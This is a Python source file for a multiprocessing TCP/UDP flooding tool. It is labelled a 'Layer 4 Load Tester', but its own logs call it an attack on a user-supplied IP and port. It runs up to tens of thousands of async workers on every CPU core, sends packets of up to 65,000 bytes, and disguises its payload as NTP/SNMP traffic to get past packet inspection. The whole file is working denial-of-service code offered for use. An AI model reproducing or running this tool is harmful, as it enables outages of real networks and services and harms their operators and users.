import asyncio
import random
import socket
import logging
import sys
import multiprocessing

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def generate_smart_payload(size):
    # Differentiating the header so the packet resembles NTP/SNMP
    header = b'\x17\x00\x03\x2a' + b'\x00' * 4
    if size <= len(header):
        return header[:size]
    return header + random.randbytes(size - len(header))

async def tcp_flood_worker(target_ip, target_port, payload, semaphore, worker_id):
	while True:
		try:
			async with semaphore:
				reader, writer = await asyncio.open_connection(target_ip, target_port)
				try:
					# Blast the payload continuously
					for _ in range(100):
						writer.write(payload)
						await writer.drain()
						
					# Log occasionally
					if random.random() < 0.01:
						logging.info(f"[L4 TCP] Worker {worker_id} successfully blasted {len(payload)*100} bytes.")
				except Exception:
					pass
				finally:
					writer.close()
					await writer.wait_closed()
		except asyncio.CancelledError:
			break
		except Exception:
			await asyncio.sleep(0.01)

async def udp_flood_worker(target_ip, target_port, payload, semaphore, worker_id):
	# Создаем ОДИН сокет на воркер вне цикла, чтобы не нагружать ОС
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	# Пред-генерация 50 уникальных пейлоадов, чтобы снять огромную нагрузку
	# с CPU (вызов random в бесконечном цикле убивал скорость Python скрипта)
	precompiled_payloads = [payload[:10] + random.randbytes(len(payload)-10) for _ in range(50)]
	
	while True:
		try:
			# Огромный бёрст напрямую в ОС без asyncio.sleep между пакетами
			for p in precompiled_payloads:
				# 100 отправок одного варианта, потом смена (5000 пакетов за микро-цикл)
				for _ in range(100):
					sock.sendto(p, (target_ip, target_port))
				
			if random.random() < 0.05:
				logging.info(f"[L4 UDP] Worker {worker_id} successfully sent massive burst.")
				
			# Возвращаем контроль event_loop на мгновение
			await asyncio.sleep(0)  
		except asyncio.CancelledError:
			break
		except Exception:
			await asyncio.sleep(0.001)

async def async_attack_core(target_ip, target_port, method, threads, payload):
	# Massive concurrency limit for L4 (OS network stack limit)
	conn_limit = min(threads, 20000)
	semaphore = asyncio.Semaphore(conn_limit)
	
	tasks = []
	for x in range(threads):
		if method == 'UDP':
			tasks.append(asyncio.create_task(udp_flood_worker(target_ip, target_port, payload, semaphore, x+1)))
		else:
			tasks.append(asyncio.create_task(tcp_flood_worker(target_ip, target_port, payload, semaphore, x+1)))
			
	try:
		await asyncio.gather(*tasks)
	except asyncio.CancelledError:
		pass

def process_worker(target_ip, target_port, method, threads, payload):
	if sys.platform == 'win32':
		asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
	try:
		asyncio.run(async_attack_core(target_ip, target_port, method, threads, payload))
	except KeyboardInterrupt:
		pass

def main():
	print("--- Layer 4 Load Tester (MULTIPROCESSING POWER) ---")
	target_ip = input("Insert Target IP (e.g. 45.139.132.87): ").strip()
	target_port = int(input("Insert Target Port (e.g. 80): ").strip())
	method = input("Select Method (TCP/UDP): ").strip().upper()
	threads = int(input("Insert TOTAL async workers (e.g. 10000): ").strip())
	packet_size = int(input("Insert Payload Size in bytes (default 65000): ") or "65000")
	
	# Generate smart payload to bypass simple packet inspection
	payload = generate_smart_payload(packet_size)
	
	cores = multiprocessing.cpu_count() or 1
	threads_per_core = max(1, threads // cores)
	
	logging.info(f"Starting L4 {method} attack on {target_ip}:{target_port} with {threads} workers across {cores} CPU Cores!")
	logging.info(f"Payload Size: {len(payload)} bytes. Standby for maximum raw socket injection...")
	
	processes = []
	for _ in range(cores):
		p = multiprocessing.Process(target=process_worker, args=(target_ip, target_port, method, threads_per_core, payload))
		p.start()
		processes.append(p)
		
	try:
		for p in processes:
			p.join()
	except KeyboardInterrupt:
		logging.info("Attack successfully cancelled. Terminating processes...")
		for p in processes:
			p.terminate()

if __name__ == '__main__':
	multiprocessing.freeze_support()
	try:
		main()
	except KeyboardInterrupt:
		print("\nStopped by user.")
		sys.exit(0)